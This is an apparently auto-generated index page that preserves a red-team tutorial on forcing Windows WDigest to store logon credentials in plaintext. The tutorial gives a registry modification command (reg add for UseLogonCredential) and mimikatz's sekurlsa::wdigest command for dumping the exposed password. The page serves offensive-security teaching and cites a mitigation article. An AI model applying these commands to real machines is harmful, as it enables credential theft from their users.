---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Forcing WDigest to Store Credentials in Plaintext

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-forcing-wdigest-to-store-credentials-in-plaintext` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Forcing WDigest to Store Credentials in Plaintext](../../topics/offensive-security/forcing-wdigest-to-store-credentials-in-plaintext.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-forcing-wdigest-to-store-credentials-in-plaintext |
| name | Forcing WDigest to Store Credentials in Plaintext |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext.md |

## Preserved Source Material

````yaml
_asset_filenames:
- mimikatz 2.2.0 x64 (oe.eo) 5_13_2019 10_42_39 PM.png
- mimikatz 2.2.0 x64 (oe.eo) 5_13_2019 10_44_54 PM.png
- wdigestdemo.gif
_body: '# Forcing WDigest to Store Credentials in Plaintext


  As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory
  in plaintext by default, which is no longer the case with newer  Windows versions.&#x20;


  It is still possible, however, to force WDigest to store secrets in plaintext.


  ## Execution


  Let''s first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:


  {% code title="attacker@victim" %}

  ```csharp

  sekurlsa::wdigest

  ```

  {% endcode %}


  Note the password field is null:


  ![](<../../.gitbook/assets/mimikatz 2.2.0 x64 (oe.eo) 5\_13\_2019 10\_42\_39 PM.png>)


  Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next
  time someone logs on to the target system:


  {% code title="attacker@victim" %}

  ```csharp

  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/mimikatz 2.2.0 x64 (oe.eo) 5\_13\_2019 10\_44\_54 PM.png>)


  Say, now the victim on the target system spawned another shell:


  {% code title="victim@local" %}

  ```csharp

  runas /user:mantvydas powershell

  ```

  {% endcode %}


  Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:


  ![](../../.gitbook/assets/wdigestdemo.gif)


  ## References


  {% embed url="https://p16.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft" %}'
_relative_path: offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext.md
````
